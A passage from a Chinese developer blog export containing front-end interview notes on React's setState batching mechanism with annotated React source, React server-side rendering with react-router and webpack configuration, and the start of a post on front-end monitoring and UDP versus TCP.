this.setState 保证内部（数据）的统一假设 setState 是同步的： 123456console.log(this.state.value); //0this.setState(&#123;value:this.state.value + 1&#125;)console.log(this.state.value); //1this.setState(&#123;value:this.state.value + 1&#125;)console.log(this.state.value); //2this.setState(&#123;value:this.state.value + 1&#125;) 这种只用到了 state 的情况下，同步 setState 是可以的。 然而这时需要将状态提升到父组件，以供多个兄弟组件共享： 123456console.log(this.props.value) // 0this.props.onIncrement();console.log(this.props.value) // 0this.props.onIncrement();console.log(this.props.value) // 0this.props.onIncrement(); 在同步模型中，虽然 this.state 会立即更新，但是 this.props 并不会。而且在没有重渲染父组件的情况下，我们不能立即更新 this.props。如果要立即更新 this.props(立即重新渲染父组件)，必须放弃批处理（根据不同的情况，性能可能有显著下降） 所以为了解决这样的问题，在 React 中，this.state 和 this.props 都是异步更新的，在上面的例子中重构前后都会打印出0，这让状态提升更加安全。 性能优化我们通常认为状态更新会按照既定顺序被应用，无论 state 是同步更新还是异步更新，然而事实并不一定如此。 React 会依据不同的调用源，给不同的 setState 调用分配不同的优先级。调用源包括事件处理、网络请求、动画等。 基本用法1234567// 用法1this.setState(&#123;&#125;,()=&gt;&#123;&#125;)// 用法2this.setState(()=(&#123;&#125;),()=&gt;&#123;&#125;)// 参数1：对象，key是 this.state 中key值，val 是修改后的值// 参数2：函数，可查看数据是否更新完成，获取到数据更新后的最新 dom 结构 不要直接修改 state 1this.state.comment = 'Hello' (X) state 更新可能会异步 从上面也知道了，React 为了性能优化，有可能会将多个 setState 调用合并为一次更新，因为 this.props 与 this.state 可能是异步更新的，你不可能依赖他们的值进行下一个 state 的计算 1this.setState(&#123;counter:this.state.counter + this.props.increment&#125;) (X) 为了弥补这个问题，使用了另一种 setState 形式，接受一个函数。这个函数接收前一个状态作为第一个参数，应用更新时的 props 作为第二个参数，代码如下： 123this.setState((prevState,props)=&gt;&#123; counter:prevState.counter + props.increment&#125;) 多次setState函数调用产生的效果会合并 当调用 setState ,React 会合并你提供的对象到当前的状态。所以当 state 是一个多键值的结构，可以单独更新其中一个，此时会 差分 更新，不会影响到其他的属性值 总结起来就是： setState 不会立刻改变 React 组件中的 state setState 通过触发一次组件的更新来引发重绘 多次 setState 函数嗲用产生的效果会合并 重绘指的更新的生命周期函数： shouldComponentUpdate:被调用时 this.state 没有更新，如果返回 false，生命周期被中断，虽然不调用之后的函数，但是 state 仍然会被更新 componentWillUpdate：被调用时 this.state 没有更新 render：被调用时 this.state 得到更新 componentDidUpdate React会将setState的效果放在队列中，积攒着一次引发更新过程。为的就是把Virtual DOM和DOM树操作降到最小，用于提高性能。 执行setState 后拿到最新的 state 12345678updateData = (newData)=&gt;&#123; this.setState( &#123;data:newData&#125;, () =&gt;&#123; console.log(this.state.data) &#125; )&#125; setState 更新机制循环调用风险 不要在 shouldComponentUpdate和 componentWillUpdate中调用 setState，不然会出现死循环 在调用 setState时候实际上会执行 enqueueSetState方法，并对 partialState、pendingStateQueue更新队列进行合并操作，最终通过 enqueueUpdate执行 state 更新。 而 performUpdateIfNecessary方法会获取 pendingElement、pendingStateQueue、pendingForceUpdate并调用 receiveComponent和 updateComponent方法进行组件更新 如果在 componentWillUpdate 和 shouldComponentUpdate 中调用 setState，此时 pendingStateQueue !== null则 performUpdateIfNessary 会调用 updateComponent 进行组件更新，而 updateComponent又会调用 shouldComponentUpdate 和 componentWillUpdate这样就导致了循环调用 setState 源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445// React 组件继承自 React.Component，而 SetState 是 React.Component 的方法，对于组件来说，setState 属于其原型方法// 在 React 中每个组件都拥有一个 this.updater，是用来驱动 state 更新的工具对象。当我们在构造函数中调用 super 的时实质调用的就是函数 ReactComponentfunction ReactComponent(props,context,updater)&#123; this.props = props; this.context = context; this.refs = emptyObject; // ReactNoopUpdateQueue 实际是没有什么意义的，只相当于是一个初始化的过程。而 ReactNoopUpdateQueue.enqueueSetState 主要起到一个在非生产版本中警告的作用。真正的 updater 是在 renderer 中注入（inject）。因此如果在 constructor 尝试调用 this.helper.isMount会返回 false，表示并没有安装（mount），如果你调用 setState，也会给出响应的警告 this.updater = updater || ReactNoopUpdateQueue;&#125;ReactComponent.prototype.setState = function(partialState,callback)&#123; // 调用 enqueueSetState 将 setState 事务放进队列中 // partialState 可以传 Object,也可以传 function,会产生新的 state 以一种 Object.assign() 的方式跟旧的 state 进行合并 // 参数 this 是组件的实例 this.updater.enqueueSetState(this,partialState); if(callback)&#123; this.updater.enqueueCallback(this,callback,'setState') &#125;&#125;var ReactUpdateQueue = &#123; // 实际通过 enqueueSetState 执行 // 1.将新的 state 放进数组 // 2.用 enqueueUpdate 来处理将要更新的实例对象 enqueueSetState：function(publicInstance,partialState)&#123; // 获取当前组件的 instance，里面有很多属性，主要关注 pendingState(待更新队列)，pendingCallbacks(更新回调队列) const internalInstance = getInernalInstanceReadyForUpdate( publickInstance, 'setState' ) if(!inernalInstance) return // 更新队列合并操作 const queue = internalInstance._pendingStateQueue || （internalInstance._pendingStateQueue = []） // partialState 可以理解为之前的 state queue.push(partialState) // 最终通过 enqueueUpdate 更新，将新的 component instance 放入一个队列 enqueueUpdate(internalInstance) &#125; // 如果存在 _pendingElement、_pendingStateQueue 和 _pendingForceUpdate 则更新组件 performUpdateIfNessary:function(transaction)&#123; if(this._pendingElement != null)&#123; ReactReconciler.receiveComponent(this,this._pendingElement,transaction,this._context) &#125; if(this._pendingStateQueue !== null || this._pendingForceUpdate)&#123; this.updateComponent(transaction,this._currentElement,this._currentElement,this._context) &#125; &#125; &#125; setState 调用栈 graph TD A[this.setState] B[newState存入pending队列] C{是否处于 batch update} D(保存组件在 dirtyComponent中) E(遍历所有的dirtyComponents 调用updateComponent 更新 pending state or props) F[调用enqueueUpdate] A --> B B --> F F --> C C == Y ==> D C == N ==> E React的setState函数实现中，会根据一个变量 isBatchingUpdates 判断是 直接更新 this.state还是 放到队列 中。 isBatchingUpdates默认false，表示setState会同步更新this.state，但是函数batchedUpdates函数会把isBatchingUpdates修改为true。当React在调用事件处理函数之前就会调用batchedUpdates，造成的后果，就是由React控制的事件处理过程setState不会同步更新this.state。 12345678910111213141516171819202122232425262728293031function enqueueUpdate(internalInstance)&#123; ReactUpdates.enqueueUpdate(internalInstance)&#125;const ReactUpdates = &#123; enqueueUpdate:function enqueueUpdate(component)&#123; // 保证 ReactUpdates.ReactReconcileTransaction 与 batchingStrategy 是存在的，否则给出对应的警告 ensureInjected(); // 如果不处于批量更新模式 if(!batchingStrategy.isBatchingUpdates)&#123; // 调用事务 batchingStrategy.batchedUpdates(enqueueUpdate,component) return &#125; // 如果处于批量更新模式,将组件放入脏组件队列，也就是待更新组件队列 dirtyComponents.psuh(component); &#125;&#125;// batchingStrategy。实质上是一种批量更新策略const ReactDefaultBatchingStrategy = &#123; isBatchingupdates:false, batchedUpdates:function(callback,a,b,c,d,e)&#123; const alreadyBatchingUpdates = ReactDefaultBatchingStrategy.isBatchingUpdates ReactDefaultBatchingStrategy.isBatchingUpdates = true if(callback)&#123; callback(a,b,c,d,e) &#125;else&#123; transaction.perform(callback,null,a,b,c,d,e) &#125; &#125;&#125; Transaction 关于 React 中的事务 Transaction,源码中有这样的 ASCII图 1234567891011121314151617181920212223242526/** * &lt;pre&gt; * wrappers (injected at creation time) * + + * | | * +-----------------|--------|--------------+ * | v | | * | +---------------+ | | * | +--| wrapper1 |---|----+ | * | | +---------------+ v | | * | | +-------------+ | | * | | +----| wrapper2 |--------+ | * | | | +-------------+ | | | * | | | | | | * | v v v v | wrapper * | +---+ +---+ +---------+ +---+ +---+ | invariants * perform(anyMethod) | | | | | | | | | | | | maintained * +-----------------&gt;|-|---|-|---|--&gt;|anyMethod|---|---|-|---|-|--------&gt; * | | | | | | | | | | | | * | | | | | | | | | | | | * | | | | | | | | | | | | * | +---+ +---+ +---------+ +---+ +---+ | * | initialize close | * +-----------------------------------------+ * &lt;/pre&gt; */ React 中的事务 Transaction，会给方法包装一个个 wrapper，其中每个 wrapper 都有两个方法：initialize 与 close。当执行方法时，需要执行事务的 perform 方法。这个方法会首先一次执行 wrapper 的 initialize,然后执行函数本身，最后执行 wrapper 的 close 方法 定义 Transaction 需要给构造函数混入 Transaction.Mixin，并需要提供一个原型方法 getTransactionWrappers 用于返回 wrapper 数组。 123456789101112131415161718192021222324var RESET_BATCHED_UPDATES = &#123; initialize:emptyFuntion, colse:function()&#123; // 重置为 false ReactDefaultBatchingStrategy.isBatchingUpdates = false; &#125;&#125;var FLUSH_BATCHED_UPPDATES = &#123; initialize:emptyFunction, close:ReactUpdates.flushBatchedUpdates.bind(ReactUpdates)&#125;var TRANSACTION_WRAPPERS = [FLUSH_BATCHED_UPDATES,RESET_BATCHED_UPDATES]；function ReactDefaultBatchingStrategyTransaction()&#123; this.reinitializeTransaction();&#125;Object.assign( ReactDefaultBatchingStrategyTransaction.prototype, Transaction.Mixin,&#123; getTransactionWrappers:function()&#123; return TRANSACTION_WRAPPERS; &#125; &#125;)var transaction = new ReactDefaultBatchingStrategyTransaction(); 重新回顾一下更新的过程，如果处于批量更新的过程中（isBatchingUpdates为 true）的时候，则直接将组件传入 dirtyComponents。如果不是的话，就开启批量更新，用事务 transaction.perform执行 enqueueUpdate，这时候 isBatchingUpdates经过上次执行已经是 true，将直接传入 dirtyComponents。那么更新的组件传入 dirtyComponent会发生什么？ batchUpdates是处于一个事务中的，该事务在 close 阶段做了两件事，首先是将 ReactDefaultBatchingStrategy.isBatchingUpdates设置为 false，即关闭批量更新的标志位，第二个就是调用方法 ReactUpdates.flushBatchedUpdates。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137// 代码有省略var flushBatchedUpdates = function()&#123; while(dirtyComponents.length)&#123; if(dirtyComponents.length)&#123; var transaction = ReactUpdatesFlushTransaction.getPooled(); // 以事务的方式执行了 runBatchedUpdates transaction.perform(runBatchedUpdates,null,transaction); ReactUpdatesFlushTransaction.release(transaction) &#125; &#125;&#125;function runBatchedUpdates(transaction)&#123; var len = transactiono.dirtyComponentsLength; // 将组件中的 mountOrder 进行了递增排序，目的就是保证更新顺序，父组件保证其子组件之前更新。 dirtyComponents.sort(mountOrderComparator); for(var i=0;i&lt;len;i++)&#123; // 在组件中获得 setState 完成之后的回调函数 var component = dirtyComponents[i]; var callbacks = component._pendingCallbacks; component._pendingCallbacks = null; // ... ReactReconciler.performUpdateIfNessary(component,transaction.reconcileTransaction) // ... if(callbacks)&#123; for(var j=0;j&lt;callbacks.length;j++)&#123; transaction.callbackQueue.enqueue( callbacks[j], component.getPublickInstance() ) &#125; &#125; &#125;&#125;// performUpdateIfNessary 执行组件实例的原型方法performUpdateIfNecessaryperformUpdateIfNessary:function(internalInstance,transaction)&#123; interbalInstance.performUpdateIfNecessary(transaction)&#125;// 省略版本var ReactCompositeComponentMixin = &#123; performUpdateIfNecessary:function(transaction)&#123; if(this._pendingStateQueue !==null || this._pendingForceUpdate)&#123; this.updateComponent( transaction, this._currentElement, this._currentElement, this._context, this._context ) &#125; &#125;&#125;updateComponent: function( transaction, prevParentElement, nextParentElement, prevUnmaskedContext, nextUnmaskedContext ) &#123; var inst = this._instance; var willReceive = false; var nextContext; var nextProps; // 验证组件context是否改变 // ...... // 验证是否是props更新还是组件state更新 if (prevParentElement === nextParentElement) &#123; nextProps = nextParentElement.props; &#125; else &#123; //存在props的更新 nextProps = this._processProps(nextParentElement.props); willReceive = true; &#125; //根据条件判断是否调用钩子函数componentWillReceiveProps if (willReceive &amp;&amp; inst.componentWillReceiveProps) &#123; inst.componentWillReceiveProps(nextProps, nextContext); &#125; //计算新的state var nextState = this._processPendingState(nextProps, nextContext); var shouldUpdate = this._pendingForceUpdate || !inst.shouldComponentUpdate || inst.shouldComponentUpdate(nextProps, nextState, nextContext); if (shouldUpdate) &#123; this._pendingForceUpdate = false; this._performComponentUpdate( nextParentElement, nextProps, nextState, nextContext, transaction, nextUnmaskedContext ); &#125; else &#123; this._currentElement = nextParentElement; this._context = nextUnmaskedContext; inst.props = nextProps; inst.state = nextState; inst.context = nextContext; &#125; &#125;// 计算新的 state 里面调用了 _processPending&#123; _processPendingState: function(props, context) &#123; var inst = this._instance; var queue = this._pendingStateQueue; var replace = this._pendingReplaceState; this._pendingReplaceState = false; this._pendingStateQueue = null; if (!queue) &#123; return inst.state; &#125; if (replace &amp;&amp; queue.length === 1) &#123; return queue[0]; &#125; var nextState = Object.assign(&#123;&#125;, replace ? queue[0] : inst.state); for (var i = replace ? 1 : 0; i &lt; queue.length; i++) &#123; var partial = queue[i]; Object.assign( nextState, typeof partial === 'function' ? partial.call(inst, nextState, props, context) : partial ); &#125; return nextState; &#125;&#125; 这一部分代码相对来说不算是很难，replace是存在是由于之前被废弃的APIthis.replaceState，我们现在不需要关心这一部分，现在我们可以知道为什么给 setState 传入的参数是函数时，就可以解决 setState 的潜在问题。 12this.setState(&#123;value:this.state.value + 1&#125;)this.setState(&#123;value:this.state.value + 1&#125;) 调用 setState是批量更新，那么在第一次调用之后，this.state.value的值并没有发生拜年话。两次更新的指都是一样的。如果传递的是会调用函数形式，那么 partial.call(inst,nextState,props,context)接受的 state 都是上一轮更新之后的新值，因此可以达到我们想要的结果。 _processPendingState 在计算完新的 state 之后会执行 _performComponentUpdate 123456789101112131415161718192021222324252627282930313233343536373839function _performComponentUpdate( nextElement, nextProps, nextState, nextContext, transaction, unmaskedContext ) &#123; var inst = this._instance; var hasComponentDidUpdate = Boolean(inst.componentDidUpdate); var prevProps; var prevState; var prevContext; if (hasComponentDidUpdate) &#123; prevProps = inst.props; prevState = inst.state; prevContext = inst.context; &#125; // 在更新之前，调用钩子函数 componentWillUpdate，然后更新了属性（props,state,context） if (inst.componentWillUpdate) &#123; inst.componentWillUpdate(nextProps, nextState, nextContext); &#125; this._currentElement = nextElement; this._context = unmaskedContext; inst.props = nextProps; inst.state = nextState; inst.context = nextContext; // 执行函数_updateRenderedComponent，涉及到 render 调用和相应的 DOM 更新 this._updateRenderedComponent(transaction, unmaskedContext); // 最后执行 componentDidUpdate if (hasComponentDidUpdate) &#123; transaction.getReactMountReady().enqueue( inst.componentDidUpdate.bind(inst, prevProps, prevState, prevContext), inst ); &#125;&#125; 到目前为止，我们已经基本介绍完了setState的更新过程，只剩一个部分没有介绍，那就是setState执行结束之后的回调函数。我们知道，setState函数中如果存在callback，则会有: 123if (callback) &#123; this.updater.enqueueCallback(this, callback);&#125; call函数会被传递给this.updater的函数enqueueCallback，然后非常类似于setState，callback会存储在组件内部实例中的_pendingCallbacks属性之中。我们知道，回调函数必须要setState真正完成之后才会调用，那么在代码中是怎么实现的。大家还记得在函数flushBatchedUpdates中有一个事务ReactUpdatesFlushTransaction: 12345678910111213//代码有省略var flushBatchedUpdates = function() &#123; while (dirtyComponents.length) &#123; if (dirtyComponents.length) &#123; //从事务pool中获得事务实例 var transaction = ReactUpdatesFlushTransaction.getPooled(); transaction.perform(runBatchedUpdates, null, transaction); //释放实例 ReactUpdatesFlushTransaction.release(transaction); &#125; //...... &#125;&#125;; 我们现在看看ReactUpdatesFlushTransaction的wrapper是怎么定义的: 12345678var UPDATE_QUEUEING = &#123; initialize: function() &#123; this.callbackQueue.reset(); &#125;, close: function() &#123; this.callbackQueue.notifyAll(); &#125;,&#125;; 我们看到在事务的close阶段定义了this.callbackQueue.notifyAll(),即执行了回调函数，通过这种方法就能保证回调函数一定是在setState真正完成之后才执行的。 现在可以回答，为什么下面这两种改代码会产生不同的情况： 1234567891011121314151617181920//未按预期执行_addValue() &#123; this.setState(&#123; value: this.state.value + 1 &#125;) this.setState(&#123; value: this.state.value + 1 &#125;)&#125;//按预期执行_addValue() &#123; setTimeout(()=&gt;&#123; this.setState(&#123; value: this.state.value + 1 &#125;); this.setState(&#123; value: this.state.value + 1 &#125;); &#125;,0)&#125; 在第一种情况下，如果打断点追踪你会发现，在第一次执行setState前，已经触发了一个 batchedUpdates，等到执行setState时已经处于一个较大的事务，因此两个setState都是会被批量更新的(相当于异步更新的过程，this.state.value值并没有立即改变)，执行setState只不过是将两者的partialState传入dirtyComponents，最后再通过事务的close阶段的flushBatchedUpdates方法去执行重新渲染。但是通过setTimeout函数的包装，两次setState都会在click触发的批量更新batchedUpdates结束之后执行，这两次setState会触发两次批量更新batchedUpdates，当然也会执行两个事务以及函数flushBatchedUpdates,这就相当于一个同步更新的过程，自然可以达到我们的目的，这也就解释了为什么React文档中既没有说setState是同步更新或者是异步更新，只是模糊地说到，setState并不保证同步更新。 DOM事件和生命周期graph TD A(DOM) B(生命周期) C[dispatchEvent-ReactEventListener.js] D[_renderNewRootComponent-ReactMount.js] E[ReactUpdates.batchedUpdates-ReactUpdates.js] F[isBatchingUpdates=true] G[transaction.perform 执行事件回调和生命周期进入事务] H[close isBatchingUpdates=false ReactUpdates.flushBatchedUpdates] I[检查 dirtyComponents 完成更新] A == type:'click' ==> C B == componentDidMount ==> D C --> E D --> E E --> F F --> G G --> H H --> I React合成事件HOC 的应用### 中间件应用Redux 的应用和原理Mobx 的应用和原理参考链接： React 渲染机制解析 React之diff算法 React JSX 使用 JSX 描述 UI 信息 React Fiber 是什么？ 为什么setState是异步的 React 中 setState() 为什么是异步的？ this.setState使用时的一些坑 React setState 简单整理总结 日常抄书之一次性弄懂setState 一次性搞懂解React生命周期 React技术内幕:setState的秘密 浅入深出setState（下篇）]]></content>
      <categories>
        <category>前端面试</category>
      </categories>
      <tags>
        <tag>前端面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React-SSR浅析]]></title>
    <url>%2F2019-05-11-React-SSR%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[React SSR 同构浅析客户端渲染（CSR）概念传统 react项目,在浏览器打开项目，查看源代码，可以看到 index.js 页面里面只有一个基本的 DOM 节点，下面引入了一个 js 文件。而项目的所有内容就是通过这个 js 来渲染，通过禁止浏览器的 javascript 功能可以看到浏览器提示要 开启 javascript 功能的提示，没有项目的内容生成。 CSR 过程: 1浏览器发送请求 =&gt; 服务器返回HTML =&gt; 浏览器发送 bundle.js 请求 =&gt; 服务器返回 bundle.js =&gt; 浏览器运行 React 代码 =&gt; 页面准备就绪 优势与劣势优势：前后端分离，前端 ajax 请求数据，后端内部处理好逻辑返回 JSON 给前端处理。代码在客户端运行，性能良好 劣势：首屏加载速度慢。SEO 差（百度爬虫不能识别 js 文件） 服务器渲染（SSR）概念SSR 过程： 1浏览器发送请求 =&gt; 服务器运行 React 代码生成页面 =&gt; 服务器返回页面 优势与劣势优势：首屏速度快 劣势：服务器性能需求大 renderToString123456789101112import &#123;renderToString&#125; from 'react-dom/server';const content = renderToString(( // 组件))app.get('/',(req,res,next)=&gt;&#123; res.send( `&lt;html&gt; &lt;div&gt;$&#123;content&#125;&lt;/div&gt; &lt;/html&gt;` )&#125;) 路由 React-router-config可识别嵌套路由，内置 ssr 方案 简单使用服务器上呈现的路由都是无状态的，所以我们将应用程序包装在无状态的 &lt;StaticRouter&gt; e而不是&lt;BrowserRouter&gt;。从服务器传入请求的路由，以便路由可以匹配。 123456789// client&lt;BroswerRouter&gt; &lt;App /&gt;&lt;/BroswerRouter&gt;// server &lt;StaticRouter location=&#123;req.url&#125; context=&#123;context&#125;&gt; &lt;App /&gt;&lt;/StaticRouter&gt; 在 &lt;Redirect&gt;客户端呈现 a 标签的时候，浏览器历史记录会更改状态，我们获得新的屏幕。在静态服务器 换机中，我们无法更改应用程序的状态。我们可以使用 context 来找出需要渲染的结果。我们找到了 context.url 就知道应用是否被重定向了。 1234567891011const context = &#123;&#125;const markup = ReactDOMServer.renderToString( &lt;StaticRouter location=&#123;req.path&#125; context=&#123;context&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt;)if(context.url)&#123; redirect(301,context.url)&#125;else&#123; &#125; 添加应用特定上下文信息路由器只会添加 context.url,如果希望重定向 301或者 302 可以在希望呈现的 UI 的某个特定分支发送 404 响应，或者如果未授权则发送 401。 12345678910111213141516171819202122232425262728293031function RedirectWithStats(&#123;from,to,status&#125;)&#123; return( &lt;Route render=&#123;(&#123;staticContext&#125;)=&gt;&#123; if(staticContext) staticContext.status = status; return &lt;Redirect from=&#123;from&#125; to=&#123;to&#125; /&gt; &#125;&#125; /&gt; )&#125;// somewhere in appfunction App()&#123; return( &lt;Switch&gt; &lt;RedirectWithStatus status=&#123;301&#125; from='/users' to='/profiles' /&gt; &lt;RedirectWithStatus status=&#123;302&#125; from='/courses' to='/dashboard' /&gt; &lt;/Switch&gt; )&#125;// serverconst context = &#123;&#125;;const markup = ReactDOMServer.renderToString( &lt;StaticRouter context=&#123;context&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt;)if(context.url)&#123; redirect(context.status,context.url)&#125; 404,401 或者任何其他状态跟上面的操作差不多，可以创建一个组件，添加一些上下文并在应用程序中的任何位置呈现它以获取不同的状态码 123456789101112131415161718192021222324252627function Status(&#123;code,children&#125;)&#123; return( &lt;Route render=&#123;(&#123;staticContext&#125;)=&gt;&#123; if(staticContext) staticContext.status = code return children; &#125;&#125; /&gt; )&#125;function NotFound()&#123; return( &lt;Status code=&#123;404&#125;&gt; &lt;div&gt; &lt;h1&gt;Sorry,can't find that.&lt;/h1&gt; &lt;/div&gt; &lt;/Status&gt; )&#125;// somewhere else&lt;Switch&gt; &lt;Route path='/about' component=&#123;About&#125; /&gt; &lt;Route path='/dashboard' component=&#123;Dashboard&#125; /&gt; &lt;Route component=&#123;NotFound&#125;&gt;&lt;/Switch&gt; 组合这不是一个真正的应用程序，但是它显示了将所有这些组合在一起所需要的所有常规部分 1234567891011121314151617181920212223242526272829303132333435// serverimport &#123;createServer&#125; from 'http';import React from 'react';import ReactDOMServer from 'react-dom/server';import &#123;StaticRouter&#125; from 'react-router';import App from './App';createServer((req,res)=&gt;&#123; const context = &#123;&#125;; const html = ReactDOMServer.renderToString( &lt;StaticRouter location=&#123;req.url&#125; context=&#123;context&#125;&gt; &lt;App /&gt; &lt;/StaticRouter&gt; ) if(context.url)&#123; res.writeHead(301,&#123; Location:context.url &#125;) res.send() &#125;else&#123; res.write(`&lt;!doctype html&gt;&lt;div id="app"&gt;$&#123;html&#125;&lt;/div&gt;`) res.send(); &#125;&#125;).listen(3000)// clientimport ReactDOM from 'react-dom';import &#123;BrowserRouter&#125; from 'react-router-dom';import App from './App';ReactDOM.render( &lt;BrowserRouter&gt; &lt;App /&gt; &lt;/BrowserRouter&gt;) ★数据的加载在页面呈现之前加载数据，React Router 导出 matchPath 它在内部使用的静态函数，以匹配路由的位置。可以在服务器上使用此功能来帮助确定在呈现之前数据的依赖项。 这种方法的要求是依赖于静态路由的配置，用于在呈现之前根据路由匹配来加载对应的数据 123456789101112131415161718192021222324252627282930313233// routes.jsconst routes = &#123; &#123; path:'/', component:Root, loadData:()=&gt; getSomeData() &#125;&#125;import &#123;router&#125; from './routes'function App()&#123; return( &lt;Switch&gt; &#123;routes.map(route=&gt;( &lt;Route &#123;...route&#125;/&gt; ))&#125; &lt;/Switch&gt; )&#125;// server import &#123;matchPath&#125; from 'react-router-dom';const promises = [];routers.some(route=&gt;&#123; const match = matchPath(req.path,route); if(match) promises.push(route.loadData(match)) return match&#125;)Promise.all(promises).then(data=&gt;&#123; &#125;) Webpack 配置公共部分1234567891011121314151617module.exports = &#123; module: &#123; rules: [&#123; test: /\.js?$/, loader: 'babel-loader', exclude: /node_modules/, options: &#123; presets: ['react', 'stage-0', ['env', &#123; // 版本兼容大部分浏览器最后2个 targets: &#123; browsers: ['last 2 versions'] &#125; &#125;]] &#125; &#125;] &#125;&#125; 服务端123456789101112131415161718192021222324252627282930313233const path = require('path');// 不打包 node modulesconst nodeExternals = require('webpack-node-externals');const merge = require('webpack-merge');const config = require('./webpack.base.js');const serverConfig = &#123; // 指明服务器 target: 'node', mode: 'development', entry: './src/server/index.js', output: &#123; filename: 'bundle.js', path: path.resolve(__dirname, 'build') &#125;, externals: [nodeExternals()], module: &#123; rules: [&#123; test: /\.css?$/, // 在高阶组件中通过注水跟脱水 css 来获取 css 代码，这个loader 提供了 ._getCss() 函数 use: ['isomorphic-style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 1, modules: true, localIdentName: '[name]_[local]_[hash:base64:5]' &#125; &#125;] &#125;] &#125;&#125;module.exports = merge(config, serverConfig); webpack-node-externals不打包引入 的 node modules isomorphic-style-loader服务端打包 CSS 可以通过这个插件在对应的 DOM 元素上生成 class 类名，然后返回 CSS 样式代码。在高阶组件中，利用插件内置 API ._getCss()将CSS 数据通过注水与脱水的方式在服务端获取，将这些字符串格式的 css 添加到服务器渲染的 HTML 就可以完成 CSS 服务器渲染 客户端123456789101112131415161718192021222324252627const path = require('path');const merge = require('webpack-merge');const config = require('./webpack.base.js');const clientConfig = &#123; mode: 'development', entry: './src/client/index.js', output: &#123; filename: 'index.js', path: path.resolve(__dirname, 'public') &#125;, module: &#123; rules: [&#123; test: /\.css?$/, use: ['style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 1, modules: true, localIdentName: '[name]_[local]_[hash:base64:5]' &#125; &#125;] &#125;] &#125;&#125;module.exports = merge(config, clientConfig); package.json1234567891011121314151617181920212223242526272829303132333435363738394041424344&#123; "name": "server", "version": "1.0.0", "description": "react-ssr", "main": "index.js", "scripts": &#123; "dev": "npm-run-all --parallel dev:**", "dev:start": "nodemon --watch build --exec node \"./build/bundle.js\"", "dev:build:server": "webpack --config webpack.server.js --watch", "dev:build:client": "webpack --config webpack.client.js --watch", "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "keywords": [ "react", "ssr" ], "author": "lbh", "license": "ISC", "dependencies": &#123; "axios": "^0.18.0", "babel-core": "^6.26.3", "babel-loader": "^7.1.5", "babel-preset-env": "^1.7.0", "babel-preset-react": "^6.24.1", "babel-preset-stage-0": "^6.24.1", "css-loader": "^2.1.1", "express": "^4.16.4", "express-http-proxy": "^1.5.1", "isomorphic-style-loader": "^5.0.1", "react": "^16.8.6", "react-dom": "^16.8.6", "react-helmet": "^5.2.0", "react-redux": "^7.0.1", "react-router-config": "^5.0.0", "react-router-dom": "^5.0.0", "redux": "^4.0.1", "redux-thunk": "^2.3.0", "style-loader": "^0.23.1", "webpack": "^4.29.6", "webpack-cli": "^3.3.0", "webpack-merge": "^4.2.1", "webpack-node-externals": "^1.7.2" &#125;&#125; nodemon一个本地服务器，可以监控文件的变化来重启服务器，全局安装 npm-run-all并行运行同名前缀的所有 script 语句，全局安装]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端面试题目汇总摘录（JS 基础篇3）]]></title>
    <url>%2F%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE%E6%B1%87%E6%80%BB%E6%91%98%E5%BD%95-JS%20%E5%9F%BA%E7%A1%80%E7%AF%873.html</url>
    <content type="text"><![CDATA[温故而知新，保持空杯心态,复习到一半的时间，突然发现了 前端面试之道，按学习这本书的路径来 JS 基础3监控前端监控一般分为三种，页面埋点、性能监控以及异常监控 页面埋点页面埋点一般会监控下面几个数据： PV/UV 停留时长 流量来源 用户交互 实现的思路分成两种，手写埋点和无埋点的方式 第一种自主选择需要监控的数据然后在相应的地方写入代码，这种方式灵活性很大，唯一的缺点就是工作量大，每个需要监控的地方都要插入代码 另一种的无埋点的方式基本不需要开发者手写埋点，而是统计所有的事件并且定时上报，这种方式虽然没有前一种繁琐，但是因为统计的是所有事件，所以还需要后期过滤出需要的数据 性能监控可以使用浏览器期自带的 Performance API 来实现功能。一行代码就可以获得页面中各种详细的性能 123456789101112131415161718192021222324252627282930313233343536373839performance.getEntriesByType('navigation')/**[ PerformanceNavigationTiming:&#123; connectEnd: 3.9999999999906777 connectStart: 3.9999999999906777 decodedBodySize: 0 domComplete: 22873.60000000001 domContentLoadedEventEnd: 22690.200000000004 domContentLoadedEventStart: 22689.999999999996 domInteractive: 22689.999999999996 domainLookupEnd: 3.9999999999906777 domainLookupStart: 3.9999999999906777 duration: 22873.700000000015 encodedBodySize: 0 entryType: "navigation" fetchStart: 3.9999999999906777 initiatorType: "navigation" loadEventEnd: 22873.700000000015 loadEventStart: 22873.60000000001 name: "" nextHopProtocol: "" redirectCount: 0 redirectEnd: 0 redirectStart: 0 requestStart: 3.9999999999906777 responseEnd: 726.4000000000124 responseStart: 3.9999999999906777 secureConnectionStart: 0 serverTiming: [] startTime: 0 transferSize: 0 type: "back_forward" unloadEventEnd: 0 unloadEventStart: 0 workerStart: 0 &#125;]*/ 异常监控对于代码运行错误，通常的办法是使用 window.onerror 拦截报错，该方法能拦截到大部分的详细报错信息，但是也有例外的 对于跨域的代码运行错误会显示 script error 对于这种情况需要给 script 标签添加 crossorigin 属性 对于某些浏览器可能不会显示调用栈信息，这种情况可以通过 arguments.callee.caller 来做栈递归 对于异步代码来说，可以使用 catch 的方式捕获错误。比如 Promise 可以直接使用 catch 函数，async await 可以使用 try catch 线上的代码是经过压缩的，打包的时候要设置 sourceMap 常考的面试题目：UDP 与 TCP 的区别是什么？UDPUDP 协议是面向无连接，不需要在正式传递数据之前先连接双方，然后 UDP 协议只是数据报文的搬运工，不保证有序且不丢失的传递到对端，并且 UDP 协议也没有任何控制流量的算法，总的来说 UDP 相较于 TCP 更加的轻便 面向无连接UDP 不要跟 TCP 一样在发送数据前进行三次握手建立连接，想发数据就可以发送了。 并且也只是数据的搬运工，不会对数据进行拆分和拼接操作。 具体来说： 在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 